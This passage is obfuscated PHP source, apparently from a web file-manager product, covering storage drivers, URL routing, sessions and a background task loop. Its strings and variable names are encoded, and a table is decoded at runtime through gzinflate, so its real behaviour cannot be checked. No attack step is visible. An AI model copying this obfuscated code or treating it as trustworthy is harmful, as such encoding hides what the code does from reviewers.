"\123\x79\163\x74\x65\x6d\56\x73\157\x75\x72\x63\145\x53\145\x63\162\x65\x74\114\x69\x73\164"; public $field = array("\163\x6f\x75\x72\143\145\x49\104", "\x74\171\160\x65\111\104", "\x63\x72\145\141\164\145\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\163\x74\x6f\x72\x61\147\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\163\x69\x7a\x65\x4d\x61\170", "\x73\171\163\x74\x65\155", "\144\145\146\x61\165\154\164", "\x64\x72\151\x76\x65\162", "\x63\157\x6e\146\151\147"); public function listData($ë›ğÙïË = false, $øÂÂ’‹¶ = "\155\157\x64\x69\x66\x79\124\151\155\x65", $ç§åÜ¦¥ = false) { $úÅ£”şñ =& $_SERVER[•Ùç É]; $ŞÂ–Ğ«ç = parent::listData($ë›ğÙïË, $øÂÂ’‹¶, $ç§åÜ¦¥); if ($ë›ğÙïË) { return $ŞÂ–Ğ«ç; } $òĞ„™›¦ = $this->ioSizeUseGet(array_to_keyvalue($ŞÂ–Ğ«ç, $úÅ£”şñ[12], $úÅ£”şñ[445])); foreach ($ŞÂ–Ğ«ç as $ŸãòØü¸ => $Ë†Åù°) { unset($ŞÂ–Ğ«ç[$ŸãòØü¸][$úÅ£”şñ[6]]); $ŞÂ–Ğ«ç[$ŸãòØü¸][$úÅ£”şñ[1893]] = isset($òĞ„™›¦[$Ë†Åù°[$úÅ£”şñ[445]]]) ? $òĞ„™›¦[$Ë†Åù°[$úÅ£”şñ[445]]] : 0; } return $ŞÂ–Ğ«ç; } public function ioSizeUseGet($ş‰ûŠ†³) { $Ô³»ğö” =& $_SERVER[•Ùç É]; if (!$ş‰ûŠ†³) { return array(); } $Ô¸ß´ïÍ = $Ô³»ğö”[2225] . implode($Ô³»ğö”[50], $ş‰ûŠ†³); $Ä¡¥Ô¦¯ = Cache::get($Ô¸ß´ïÍ); if ($Ä¡¥Ô¦¯) { return $Ä¡¥Ô¦¯; } $Ü¡ãßÅ² = array($Ô³»ğö”[862] => $Ô³»ğö”[445], $Ô³»ğö”[2226] => $Ô³»ğö”[78]); $§¸˜Éè¦ = array($Ô³»ğö”[862] => array($Ô³»ğö”[7], $ş‰ûŠ†³)); $Ä¡¥Ô¦¯ = Model($Ô³»ğö”[834])->field($Ü¡ãßÅ²)->where($§¸˜Éè¦)->group($Ô³»ğö”[862])->select(); $Ä¡¥Ô¦¯ = array_to_keyvalue($Ä¡¥Ô¦¯, $Ô³»ğö”[445], $Ô³»ğö”[78]); Cache::set($Ô¸ß´ïÍ, $Ä¡¥Ô¦¯, 600); return $Ä¡¥Ô¦¯; } public function getConfig($»È–¬«­) { $¿ÒñşäÎ = parent::listData($»È–¬«­); return json_decode($¿ÒñşäÎ[$_SERVER[•Ùç É][6]], !0); } public function update($â¡âÉí„, $Ïƒè€××) { $ü®‹‰õ¬ =& $_SERVER[•Ùç É]; $¼ïÉ‡ë­ = $Ïƒè€××[$ü®‹‰õ¬[32]]; $¡È”¼Ó£ = array_to_keyvalue(parent::listData(), $ü®‹‰õ¬[32]); if (isset($¡È”¼Ó£[$¼ïÉ‡ë­]) && $¡È”¼Ó£[$¼ïÉ‡ë­][$ü®‹‰õ¬[445]] != $â¡âÉí„) { return !1; } $this->checkPwd($â¡âÉí„, $Ïƒè€××); if (isset($Ïƒè€××[$ü®‹‰õ¬[2227]]) && $Ïƒè€××[$ü®‹‰õ¬[2227]] == $ü®‹‰õ¬[90]) { $this->checkConfig($Ïƒè€××); } unset($Ïƒè€××[$ü®‹‰õ¬[2227]]); $™İÙ“› = parent::update($â¡âÉí„, $Ïƒè€××); if ($™İÙ“› && $Ïƒè€××[$ü®‹‰õ¬[37]]) { $§öÃÕ¿ = 0; foreach ($¡È”¼Ó£ as $šä­ÊÙá) { if ($šä­ÊÙá[$ü®‹‰õ¬[37]] && $šä­ÊÙá[$ü®‹‰õ¬[445]] != $â¡âÉí„) { $§öÃÕ¿ = $šä­ÊÙá[$ü®‹‰õ¬[445]]; parent::update($šä­ÊÙá[$ü®‹‰õ¬[445]], array($ü®‹‰õ¬[37] => 0)); } } $this->updateBackup($â¡âÉí„, $§öÃÕ¿); } return $™İÙ“›; } public function add($Ì‰ì¤şÁ) { $£¼–´ş” =& $_SERVER[•Ùç É]; $ÍÁ¹½©í = array_to_keyvalue(parent::listData(), $£¼–´ş”[32]); if (isset($ÍÁ¹½©í[$Ì‰ì¤şÁ[$£¼–´ş”[32]]])) { return !1; } $this->checkConfig($Ì‰ì¤şÁ); $“´³Å³‰ = parent::insert($Ì‰ì¤şÁ); if ($“´³Å³‰ && $Ì‰ì¤şÁ[$£¼–´ş”[37]]) { foreach ($ÍÁ¹½©í as $‚ÏÙøëÃ) { if ($‚ÏÙøëÃ[$£¼–´ş”[37]]) { parent::update($‚ÏÙøëÃ[$£¼–´ş”[445]], array($£¼–´ş”[37] => 0)); } } } return $“´³Å³‰; } public function updateBackup($úÖ“»¢¡, $³‚ËÂÊø) { $Ê…šª¤‘ =& $_SERVER[•Ùç É]; if (!$³‚ËÂÊø) { return; } $‚“ó¬´ = Model($Ê…šª¤‘[794])->config(); if ($‚“ó¬´[$Ê…šª¤‘[1675]] != $Ê…šª¤‘[90] || $‚“ó¬´[$Ê…šª¤‘[796]] != $³‚ËÂÊø) { return; } $Å™›²–” = Model($Ê…šª¤‘[815])->get($Ê…šª¤‘[825]); $Å™›²–” = json_decode($Å™›²–”, !0); if (!$Å™›²–”) { return; } $Å™›²–”[$Ê…šª¤‘[796]] = $úÖ“»¢¡; Model($Ê…šª¤‘[815])->set(array($Ê…šª¤‘[825] => $Å™›²–”)); } public function checkPwd($‡ï®ğ»Â, &$½÷Ÿñ) { $Š·¤‘¯‰ =& $_SERVER[•Ùç É]; if (empty($½÷Ÿñ[$Š·¤‘¯‰[6]])) { return; } $Ú¡ŒËı¨ = json_decode($½÷Ÿñ[$Š·¤‘¯‰[6]], !0); $¼³ò°Ÿ = $Š·¤‘¯‰[12]; $¬¦ïÂğ¥ = array($Š·¤‘¯‰[2228], $Š·¤‘¯‰[2229], $Š·¤‘¯‰[940]); foreach ($¬¦ïÂğ¥ as $Ã´¸×) { if (isset($Ú¡ŒËı¨[$Ã´¸×])) { $¼³ò°Ÿ = $Ã´¸×; break; } } if (!$¼³ò°Ÿ) { return; } $ÖÓÜ¸—­ = $this->getConfig($‡ï®ğ»Â); $‚•¾Ñ…Ø = $ÖÓÜ¸—­[$¼³ò°Ÿ]; $ı›Ûó‹– = $Ú¡ŒËı¨[$¼³ò°Ÿ]; if ($ı›Ûó‹– == str_repeat($Š·¤‘¯‰[205], strlen($‚•¾Ñ…Ø))) { $Ú¡ŒËı¨[$¼³ò°Ÿ] = $‚•¾Ñ…Ø; $½÷Ÿñ[$Š·¤‘¯‰[6]] = json_encode($Ú¡ŒËı¨); } else { if ($ı›Ûó‹– != $‚•¾Ñ…Ø) { $½÷Ÿñ[$Š·¤‘¯‰[2227]] = $Š·¤‘¯‰[90]; } } } public function checkConfig(&$•ÅÒÛ¢í, $ƒ»¥ÜÙÁ = false) { $ÁŸçÖÎÈ =& $_SERVER[•Ùç É]; $œÔ÷ÒÙÖ = strtolower($•ÅÒÛ¢í[$ÁŸçÖÎÈ[97]]); $ë”ú“ß = json_decode($•ÅÒÛ¢í[$ÁŸçÖÎÈ[6]], !0); foreach ($ë”ú“ß as $Öí–»šâ => $ƒë€úç) { if (is_string($ƒë€úç)) { $ë”ú“ß[$Öí–»šâ] = trim($ƒë€úç); } } $ë”ú“ß[$ÁŸçÖÎÈ[2230]] = rand_string(6); $Ö Ÿâ = $GLOBALS[$ÁŸçÖÎÈ[6]][$ÁŸçÖÎÈ[91]][$ÁŸçÖÎÈ[871]]; $óÊè€Ê€ = isset($Ö Ÿâ[$œÔ÷ÒÙÖ]) ? $Ö Ÿâ[$œÔ÷ÒÙÖ] : ucfirst($œÔ÷ÒÙÖ); $á…ñóõ = $ÁŸçÖÎÈ[76] . $óÊè€Ê€; if (!$óÊè€Ê€ || !class_exists($á…ñóõ)) { if ($ƒ»¥ÜÙÁ) { return LNG($ÁŸçÖÎÈ[2231]); } write_log(array($ÁŸçÖÎÈ[2232], $•ÅÒÛ¢í, get_caller_info()), $ÁŸçÖÎÈ[2233]); show_json(LNG($ÁŸçÖÎÈ[2231]), !1, $•ÅÒÛ¢í); } $òÚŒÉÊ = new $á…ñóõ($ë”ú“ß); if (in_array($œÔ÷ÒÙÖ, $òÚŒÉÊ->objectDriver)) { if (!$òÚŒÉÊ->isBucketCors() && !$òÚŒÉÊ->setBucketCors()) { $ã”íÉ† = LNG($ÁŸçÖÎÈ[2234]); $ã”íÉ† .= $ÁŸçÖÎÈ[2235] . LNG($ÁŸçÖÎÈ[2236]); if ($ƒ»¥ÜÙÁ) { return $ã”íÉ†; } show_json($ã”íÉ†, !1); } } $÷¬Ñ´÷ = rtrim($ë”ú“ß[$ÁŸçÖÎÈ[1231]], $ÁŸçÖÎÈ[8]) . $ÁŸçÖÎÈ[8]; $Å¤«Ó³ì = $òÚŒÉÊ->getPath($÷¬Ñ´÷ . $ÁŸçÖÎÈ[1235]); if (!$òÚŒÉÊ->mkfile($Å¤«Ó³ì)) { if ($ƒ»¥ÜÙÁ) { return LNG($ÁŸçÖÎÈ[2234]); } show_json(LNG($ÁŸçÖÎÈ[2234]), !1); } $ë”ú“ß[$ÁŸçÖÎÈ[1231]] = $÷¬Ñ´÷; $•ÅÒÛ¢í[$ÁŸçÖÎÈ[6]] = json_encode($ë”ú“ß); $•ÅÒÛ¢í[$ÁŸçÖÎÈ[97]] = $óÊè€Ê€; return !0; } public function driverListSystem() { $¤Ôâ“³œ =& $_SERVER[•Ùç É]; $àßôÒ´‰ = parent::listData(); $æ¼Ì´Ê = array(); foreach ($àßôÒ´‰ as $ˆøÖÑš†) { unset($ˆøÖÑš†[$¤Ôâ“³œ[217]], $ˆøÖÑš†[$¤Ôâ“³œ[87]]); $ˆøÖÑš†[$¤Ôâ“³œ[6]] = json_decode($ˆøÖÑš†[$¤Ôâ“³œ[6]], !0); $æ¼Ì´Ê[] = $ˆøÖÑš†; } return $æ¼Ì´Ê; } public function defaultDriver() { $Ÿº®ö­Ü =& $_SERVER[•Ùç É]; $Ôâ“ò™È = parent::listData(); $¿‹€ô² = array_filter_by_field($Ôâ“ò™È, $Ÿº®ö­Ü[37], 1); $¿‹€ô² = $¿‹€ô²[0]; if ($¿‹€ô²) { $¿‹€ô²[$Ÿº®ö­Ü[6]] = json_decode($¿‹€ô²[$Ÿº®ö­Ü[6]], !0); } return $¿‹€ô²; } public function driverInfo($®ğò É) { $Ã¨Àªæ˜ =& $_SERVER[•Ùç É]; $¨œ‘ÀŞî = array_to_keyvalue(parent::listData(), $Ã¨Àªæ˜[445]); if (!isset($¨œ‘ÀŞî[$®ğò É])) { return !1; } $¢©Ç™ñœ = $¨œ‘ÀŞî[$®ğò É]; $¢©Ç™ñœ[$Ã¨Àªæ˜[6]] = json_decode($¢©Ç™ñœ[$Ã¨Àªæ˜[6]], !0); return $¢©Ç™ñœ; } public function remove($ÆÑ³¾õ) { $this->removeShareItems($ÆÑ³¾õ); return parent::remove($ÆÑ³¾õ); } public function removeWithFile($Ãì´§Äé, $û®Î®õ) { $Ÿ­²£  =& $_SERVER[•Ùç É]; $ë³É¤äÂ = array($Ÿ­²£ [862] => $Ãì´§Äé); $ÄÎç¼ = Model($Ÿ­²£ [514])->where($ë³É¤äÂ)->count(); $âîÙ›± = Model($Ÿ­²£ [514])->where($ë³É¤äÂ)->sum($Ÿ­²£ [78]); $Ç¶Ö–Ğá = $û®Î®õ . $Ÿ­²£ [2237] . $Ãì´§Äé; $ÙéÆ–¨Ú = LNG($û®Î®õ == $Ÿ­²£ [590] ? $Ÿ­²£ [2238] : $Ÿ­²£ [2239]); $‘ Ô¥¨ä = new TaskFileTransfer($Ç¶Ö–Ğá, $Ÿ­²£ [2233], $ÄÎç¼, $ÙéÆ–¨Ú . "\50{$Ãì´§Äé}\x29"); $‘ Ô¥¨ä->task[$Ÿ­²£ [808]] = (double) $âîÙ›±; $¬Í÷Î‘ = KodIO::defaultDriver(); $Â­‡Èğº = $¬Í÷Î‘[$Ÿ­²£ [445]]; $íÌœÉ˜… = "\173\151\x6f\72{$Â­‡Èğº}\175\57"; $¡¦ĞñàÃ = !0; $ëÎÙñ·â = array(); $‡‘„ô°¸ = Model($Ÿ­²£ [216])->where($ë³É¤äÂ)->field($Ÿ­²£ [2240])->select(); foreach ($‡‘„ô°¸ as $¶Ï­ñÒ) { $Öß”Ç…† = $¶Ï­ñÒ[$Ÿ­²£ [86]]; $è«š›ÈÉ = $íÌœÉ˜… . str_replace("\x7b\x69\x6f\72{$Ãì´§Äé}\175\57", $Ÿ­²£ [12], $Öß”Ç…†); if (!IO::exist($Öß”Ç…†)) { $ëÎÙñ·â[] = $¶Ï­ñÒ[$Ÿ­²£ [511]]; $‘ Ô¥¨ä->updateFileEnd($¶Ï­ñÒ[$Ÿ­²£ [32]], $¶Ï­ñÒ[$Ÿ­²£ [78]]); continue; } if (IO::exist($è«š›ÈÉ)) { $‘ Ô¥¨ä->updateFileEnd($¶Ï­ñÒ[$Ÿ­²£ [32]], $¶Ï­ñÒ[$Ÿ­²£ [78]]); continue; } if (!IO::move($Öß”Ç…†, get_path_father($è«š›ÈÉ))) { $¡¦ĞñàÃ = !1; break; } $ë³É¤äÂ = array($Ÿ­²£ [511] => $¶Ï­ñÒ[$Ÿ­²£ [511]]); $´õ«Ê™ä = array($Ÿ­²£ [862] => $Â­‡Èğº, $Ÿ­²£ [86] => $è«š›ÈÉ); Model($Ÿ­²£ [216])->where($ë³É¤äÂ)->save($´õ«Ê™ä); } $this->removeByFileID($ëÎÙñ·â); if (!$¡¦ĞñàÃ) { $‘ Ô¥¨ä->stop($Ç¶Ö–Ğá); return !1; } $‘ Ô¥¨ä->end(); if ($û®Î®õ == $Ÿ­²£ [1873]) { $this->remove($Ãì´§Äé); } } public function progress($‘Òëàá, $ıÄàÎ­å) { return Task::get($ıÄàÎ­å . $_SERVER[•Ùç É][2237] . $‘Òëàá); } private function removeByFileID($Èè´É§ä = array()) { $Ä¿Ô¿Ó… =& $_SERVER[•Ùç É]; if (empty($Èè´É§ä)) { return; } $÷¾Â­Ù = array($Ä¿Ô¿Ó…[511] => array($Ä¿Ô¿Ó…[7], $Èè´É§ä)); $Š‡ñº” = Model($Ä¿Ô¿Ó…[1384])->where($÷¾Â­Ù)->field($Ä¿Ô¿Ó…[183])->select(); if (!$Š‡ñº”) { return; } $Š‡ñº” = array_to_keyvalue($Š‡ñº”, $Ä¿Ô¿Ó…[12], $Ä¿Ô¿Ó…[183]); foreach ($Š‡ñº” as $Ïó»ÛÓÊ) { Model($Ä¿Ô¿Ó…[460])->removeNow($Ïó»ÛÓÊ, !1); } } private function removeShareItems($ŸÕÛ¼Á£) { $ÕÎöÈõ =& $_SERVER[•Ùç É]; $ã«‡³İ™ = "\x7b\151\x6f\x3a{$ŸÕÛ¼Á£}\x7d\x2f"; $®¹ªè–ê = array($ÕÎöÈõ[183] => 0, $ÕÎöÈõ[1226] => array($ÕÎöÈõ[429], "{$ã«‡³İ™}\45")); $Çõï®® = Model($ÕÎöÈõ[1884])->where($®¹ªè–ê)->field($ÕÎöÈõ[635])->select(); if (empty($Çõï®®)) { return; } $ãåÅš“Ÿ = array_to_keyvalue($Çõï®®, $ÕÎöÈõ[12], $ÕÎöÈõ[635]); Model($ÕÎöÈõ[634])->remove($ãåÅš“Ÿ); } } goto d«ëÒ†¶²‰; AÊËŒÃµé: define($_SERVER[•Ùç É][0], $_SERVER[•Ùç É][1]); $_SERVER[Ì»Ÿâ÷ƒ] = explode($_SERVER[•Ùç É][2], gzinflate(substr($_SERVER[•Ùç É][3], 10, -8))); function binCheckEq($Çƒ°Ü£º, $¾„¸š­å) { return $Çƒ°Ü£º == $¾„¸š­å; } goto EÇÚ£êÒ²â; e„ùùàµ‚ö: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\136\57\135\53", "\72\x6e\165\x6d" => "\133\x30\x2d\71\x5d\53", "\x3a\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($ç¨œÎ¶, $ış¾îñ§) { $”••ÄÆ =& $_SERVER[•Ùç É]; if ($ç¨œÎ¶ == $”••ÄÆ[1641]) { $¥´ÍÇ„µ = array_map($”••ÄÆ[1642], $ış¾îñ§[0]); $ˆÀÚ¶³å = strpos($ış¾îñ§[1], $”••ÄÆ[8]) === 0 ? $ış¾îñ§[1] : $”••ÄÆ[8] . $ış¾îñ§[1]; $Çá¬¸’ = $ış¾îñ§[2]; } else { $¥´ÍÇ„µ = null; $ˆÀÚ¶³å = strpos($ış¾îñ§[0], $”••ÄÆ[8]) === 0 ? $ış¾îñ§[0] : $”••ÄÆ[8] . $ış¾îñ§[0]; $Çá¬¸’ = $ış¾îñ§[1]; } array_push(self::$maps, $¥´ÍÇ„µ); array_push(self::$routes, $ˆÀÚ¶³å); array_push(self::$methods, strtoupper($ç¨œÎ¶)); array_push(self::$callbacks, $Çá¬¸’); } public static function error($û õ’ñº) { self::$errorCallback = $û õ’ñº; } public static function haltOnMatch($èÁ‚™´ç = true) { self::$halts = $èÁ‚™´ç; } public static function dispatch() { $ñËíÉÒÈ =& $_SERVER[•Ùç É]; $¢ƒ²âºõ = parse_url($_SERVER[$ñËíÉÒÈ[1643]], PHP_URL_PATH); $‘ÁÖº£ = $_SERVER[$ñËíÉÒÈ[162]]; $”µ®Ñï· = array_keys(static::$patterns); $³”ª‘ÔÆ = array_values(static::$patterns); $ÊŞ¦Œ = !1; self::$routes = preg_replace($ñËíÉÒÈ[1327], $ñËíÉÒÈ[8], self::$routes); if (in_array($¢ƒ²âºõ, self::$routes)) { $Ù¸Šåâ = array_keys(self::$routes, $¢ƒ²âºõ); foreach ($Ù¸Šåâ as $øˆÁŠŞ¤) { if (self::$methods[$øˆÁŠŞ¤] == $‘ÁÖº£ || self::$methods[$øˆÁŠŞ¤] == $ñËíÉÒÈ[1644] || in_array($‘ÁÖº£, self::$maps[$øˆÁŠŞ¤])) { $ÊŞ¦Œ = !0; if (!is_object(self::$callbacks[$øˆÁŠŞ¤])) { $õÂš²é‘ = explode($ñËíÉÒÈ[8], self::$callbacks[$øˆÁŠŞ¤]); $‚¸ı„˜ò = end($õÂš²é‘); $ĞÜ”¼ ¯ = explode($ñËíÉÒÈ[1259], $‚¸ı„˜ò); $ùõÌ¤ó = new $ĞÜ”¼ ¯[0](); $ùõÌ¤ó->{$ĞÜ”¼ ¯[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$øˆÁŠŞ¤]); if (self::$halts) { return; } } } } } else { $Òµ¢Ê¯ = 0; foreach (self::$routes as $øˆÁŠŞ¤) { if (strpos($øˆÁŠŞ¤, $ñËíÉÒÈ[4]) !== !1) { $øˆÁŠŞ¤ = str_replace($”µ®Ñï·, $³”ª‘ÔÆ, $øˆÁŠŞ¤); } if (preg_match($ñËíÉÒÈ[1645] . $øˆÁŠŞ¤ . $ñËíÉÒÈ[1646], $¢ƒ²âºõ, $‘ò—´ Ÿ)) { if (self::$methods[$Òµ¢Ê¯] == $‘ÁÖº£ || self::$methods[$Òµ¢Ê¯] == $ñËíÉÒÈ[1644] || !empty(self::$maps[$Òµ¢Ê¯]) && in_array($‘ÁÖº£, self::$maps[$Òµ¢Ê¯])) { $ÊŞ¦Œ = !0; array_shift($‘ò—´ Ÿ); if (!is_object(self::$callbacks[$Òµ¢Ê¯])) { $õÂš²é‘ = explode($ñËíÉÒÈ[8], self::$callbacks[$Òµ¢Ê¯]); $‚¸ı„˜ò = end($õÂš²é‘); $ĞÜ”¼ ¯ = explode($ñËíÉÒÈ[1259], $‚¸ı„˜ò); $ùõÌ¤ó = new $ĞÜ”¼ ¯[0](); if (!method_exists($ùõÌ¤ó, $ĞÜ”¼ ¯[1])) { echo $ñËíÉÒÈ[1647]; } else { call_user_func_array(array($ùõÌ¤ó, $ĞÜ”¼ ¯[1]), $‘ò—´ Ÿ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Òµ¢Ê¯], $‘ò—´ Ÿ); if (self::$halts) { return; } } } } $Òµ¢Ê¯++; } } if ($ÊŞ¦Œ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $êœÃ€Æ =& $_SERVER[•Ùç É]; header($_SERVER[$êœÃ€Æ[1648]] . $êœÃ€Æ[1649]); echo $êœÃ€Æ[1650]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ñËíÉÒÈ[1643]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¾’ï†ğ£ =& $_SERVER[•Ùç É]; static $¶ÃîÅäŞ = false; if ($¶ÃîÅäŞ) { return $¶ÃîÅäŞ; } $‚ Âˆõó = $GLOBALS[$¾’ï†ğ£[6]][$¾’ï†ğ£[395]]; self::$sessionTime = $‚ Âˆõó[$¾’ï†ğ£[1651]]; $¬—…ĞùÀ = isset($GLOBALS[$¾’ï†ğ£[1652]]) ? $GLOBALS[$¾’ï†ğ£[1652]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¬—…ĞùÀ)) { self::$sessionSign = Cookie::get($¬—…ĞùÀ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¬—…ĞùÀ, self::$sessionSign, self::$sessionTime); $Øà¯Ô‰À = $‚ Âˆõó[$¾’ï†ğ£[1653]]; $«çÃŞ”™ = $‚ Âˆõó[$Øà¯Ô‰À]; $Ù€œÒ«Ô = $‚ Âˆõó[$¾’ï†ğ£[873]]; switch ($Øà¯Ô‰À) { case $¾’ï†ğ£[21]: self::$handle = Model($¾’ï†ğ£[874]); break; case $¾’ï†ğ£[875]: self::$handle = new CacheRedis($«çÃŞ”™, $Ù€œÒ«Ô); break; case $¾’ï†ğ£[876]: self::$handle = new CacheMemcached($«çÃŞ”™, $Ù€œÒ«Ô); break; case $¾’ï†ğ£[216]: $«çÃŞ”™[$¾’ï†ğ£[86]] = $«çÃŞ”™[$¾’ï†ğ£[86]] . $¾’ï†ğ£[1654]; self::$handle = new CacheFile($«çÃŞ”™, $Ù€œÒ«Ô); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¶ÃîÅäŞ = new self(); return $¶ÃîÅäŞ; } public static function getBySign($”»Æ¤óÄ) { $†‘ç«ƒ = self::$handle->get($”»Æ¤óÄ); $†‘ç«ƒ = unserialize($†‘ç«ƒ); return is_array($†‘ç«ƒ) ? $†‘ç«ƒ : array(); } public static function setBySign($ú’å©·Â, $ãÔ×“¿) { CacheLock::lock($ú’å©·Â); self::$handle->set($ú’å©·Â, serialize($ãÔ×“¿), self::$sessionTime); CacheLock::unlock($ú’å©·Â); } public static function sign($¾æÔ˜¶€ = false) { if ($¾æÔ˜¶€) { self::$sessionSign = $¾æÔ˜¶€; } self::init(); return self::$sessionSign; } public static function set($ú€¨Â“Î, $¤Äï˜ğü = false) { self::init(); if (is_array($ú€¨Â“Î)) { foreach ($ú€¨Â“Î as $åè–Œ’» => $Ä°Ê ²) { array_set_value(self::$data, $åè–Œ’», $Ä°Ê ²); } } else { array_set_value(self::$data, $ú€¨Â“Î, $¤Äï˜ğü); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ŸÀæ¼¼¦ = false) { self::init(); if (!$ŸÀæ¼¼¦) { return self::$data; } return array_get_value(self::$data, $ŸÀæ¼¼¦); } public static function remove($ä®ºşØƒ) { self::init(); unset(self::$data[$ä®ºşØƒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[•Ùç É][879])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $è¡¹‹¶” =& $_SERVER[•Ùç É]; if (self::valueGet($è¡¹‹¶”[795]) != $è¡¹‹¶”[90]) { return; } if (self::valueGet($è¡¹‹¶”[1655]) == $è¡¹‹¶”[90]) { $™«í„‹Ô = self::valueGet($è¡¹‹¶”[1656]); if (time() - $™«í„‹Ô > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($è¡¹‹¶”[1655], $è¡¹‹¶”[90]); self::log($è¡¹‹¶”[1657] . ACTION . $è¡¹‹¶”[1658]); Hook::bind($è¡¹‹¶”[1659], $è¡¹‹¶”[1660]); $ò †âÄá = 0; while (!0) { self::cacheClear(); if (self::valueGet($è¡¹‹¶”[795]) != $è¡¹‹¶”[90]) { self::valueSet($è¡¹‹¶”[1655], $è¡¹‹¶”[214]); self::log($è¡¹‹¶”[1661]); die; } $·ê Âæ = time(); if ($·ê Âæ - $ò †âÄá >= 60) { self::valueSet(array($è¡¹‹¶”[1655] => $è¡¹‹¶”[90], $è¡¹‹¶”[1656] => $·ê Âæ)); $ò †âÄá = $·ê Âæ; } if (!file_exists(USER_SYSTEM . $è¡¹‹¶”[1662])) { self::valueSet(array($è¡¹‹¶”[1655] => $è¡¹‹¶”[214], $è¡¹‹¶”[795] => $è¡¹‹¶”[214])); self::log($è¡¹‹¶”[1663]); die; } $öÚÂ Å© = file_get_contents(BASIC_PATH . $è¡¹‹¶”[1664]); $ù™—à©æ = KOD_VERSION . $è¡¹‹¶”[10] . KOD_VERSION_BUILD; $ìŠŞ‹À = match_text($öÚÂ Å©, $è¡¹‹¶”[1665]) . $è¡¹‹¶”[10] . match_text($öÚÂ Å©, $è¡¹‹¶”[1666]); if ($ìŠŞ‹À != $ù™—à©æ) { self::restart(); self::log("\x73\x74\157\x70\145\x64\56\133\166\x65\x72\163\151\x6f\x6e\x20\x75\x70\144\x61\x74\145\x3b{$versionNow}\40\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $€Ê³³ú =& $_SERVER[•Ùç É]; http_close(); $GLOBALS[$€Ê³³ú[1667]] = 1; $_SERVER[$€Ê³³ú[1668]] = $€Ê³³ú[1669]; $_COOKIE = array(); $GLOBALS[$€Ê³³ú[1670]] = 1; $GLOBALS[$€Ê³³ú[1671]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÅËËµ–ô =& $_SERVER[•Ùç É]; http_close(); self::valueSet($ÅËËµ–ô[795], $ÅËËµ–ô[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÅËËµ–ô[1655] => $ÅËËµ–ô[214], $ÅËËµ–ô[795] => $ÅËËµ–ô[90])); self::log($ÅËËµ–ô[1672]); } public static function taskSwitch() { $Ñ™ÛèÁ€ =& $_SERVER[•Ùç É]; $¿ÌÅ „ = self::valueGet($Ñ™ÛèÁ€[795]) == $Ñ™ÛèÁ€[90] ? $Ñ™ÛèÁ€[214] : $Ñ™ÛèÁ€[90]; self::valueSet($Ñ™ÛèÁ€[795], $¿ÌÅ „); } public static function shutdownEvent() { $¤İ”¶° =& $_SERVER[•Ùç É]; self::valueSet($¤İ”¶°[1655], $¤İ”¶°[214]); self::log($¤İ”¶°[1673]); } public static function config($“È¡­¸, $‰­“¬”Î) { self::valueSet($_SERVER[•Ùç É][795], $“È¡­¸); } private static function taskRunAll() { $…Á³°§ó =& $_SERVER[•Ùç É]; $¯ˆŞ¼¥ = timeFloat(); $°€ğíÙ = Model($…Á³°§ó[1674])->listData(); $‚‰ÏÈ— = count($°€ğíÙ); for ($°¥Ğ²ğ– = 0; $°¥Ğ²ğ– < $‚‰ÏÈ—; $°¥Ğ²ğ–++) { $©·“‡àø = $°€ğíÙ[$°¥Ğ²ğ–]; if (!$©·“‡àø[$…Á³°§ó[445]] || $©·“‡àø[$…Á³°§ó[1675]] != $…Á³°§ó[90]) { continue; } if (!self::taskTimeCheck($©·“‡àø)) { continue; } self::taskRun($©·“‡àø); } Hook::trigger($…Á³°§ó[1676]); self::taskQueueRun($¯ˆŞ¼¥); } private static function taskQueueRun($½Ø³“‘¹) { $ÜóÔ–ÂÔ = 10; while (!0) { $µ¢¥í—ä = TaskQueue::run(); if ($µ¢¥í—ä === !1) { break; } if (timeFloat() - $½Ø³“‘¹ >= $ÜóÔ–ÂÔ) { break; } } } private static function taskTimeCheck($ÏÊ· Ş) { $éíÔ¥™† =& $_SERVER[•Ùç É]; $ÄòõÄÓø = json_decode($ÏÊ· Ş[$éíÔ¥™†[196]], !0); $Ï³õç° = intval($ÏÊ· Ş[$éíÔ¥™†[1656]]); $˜Ô»Í† = strtotime($éíÔ¥™†[1677] . $ÄòõÄÓø[$éíÔ¥™†[1678]] . $éíÔ¥™†[1679]) - strtotime($éíÔ¥™†[1680]); $¥û¡§¹ = time() - strtotime(date($éíÔ¥™†[1681]) . $éíÔ¥™†[1682]); $Êãô„ìò = $¥û¡§¹ >= $˜Ô»Í† && $¥û¡§¹ <= $˜Ô»Í† + 3600; switch ($ÄòõÄÓø[$éíÔ¥™†[33]]) { case $éíÔ¥™†[1683]: if (time() - $Ï³õç° < 3600 * 24 * 30) { return !1; } if ($ÄòõÄÓø[$éíÔ¥™†[1683]] == date($éíÔ¥™†[1684]) && $Êãô„ìò) { return !0; } break; case $éíÔ¥™†[1685]: if (time() - $Ï³õç° < 